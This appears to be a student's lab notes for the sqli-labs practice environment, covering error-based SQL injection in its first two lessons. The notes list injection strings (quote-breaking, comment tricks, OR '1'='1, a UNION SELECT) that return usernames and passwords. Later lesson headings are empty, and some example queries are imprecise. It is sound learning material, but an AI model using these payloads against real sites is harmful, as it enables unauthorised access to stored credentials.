# sqli_labs
## lesson1
### Error-Based: Single Quotes,String
?id=1 or any other number gives the respective username and password, similar to the query: select * from TABLE where id=1;
In the url after trying some special cases, we find that odd number of single quotes breaks the query and also string input throwing error.
Error:  right syntax to use near ””) LIMIT 0,1′ at line 1.
?id=1′)–-+  : this gives us back the username and password. (here -- is used to comment out rest of the things).
Commonly used injections like ' OR '1'='1--
OR '1'='1' /*  in url after execution it would be like ?OR%20%271%27=%271%27%20/*
?id=-1' union select 1,2,database() --+
SELECT username,password from 'users' WHERE '?id'=0 OR 1=1; (here 1=1 is equivalent to true).
SELECT username,password from 'users' WHERE ?id=9 trying out different id no.s we get the desired output when id is 9.

## lesson2
### Error-Based: IntegerBased
when we give ?id=1- we see the error as right syntax to use near'LIMIT 0,1' at line 1 (query broke)
error that extra " and 'quotes are present which means that the input is enclosed in them.
Select * from TABLE where id = 1’ ;
so there is use of integer for the query
Select * from TABLE where id = (some integer value);
if we comment out the id number as (-- is used to comment out the input): http://localhost/sqli-labs/Less-2/?id=1 -- 
we receive the username and password.

## lesson3
### Lesson 3: Error-based single quotes with twist – string

## lesson4
### Lesson 4: Error-based double quotes string

## lesson5
### Lesson 5:Fixing the query without using comments
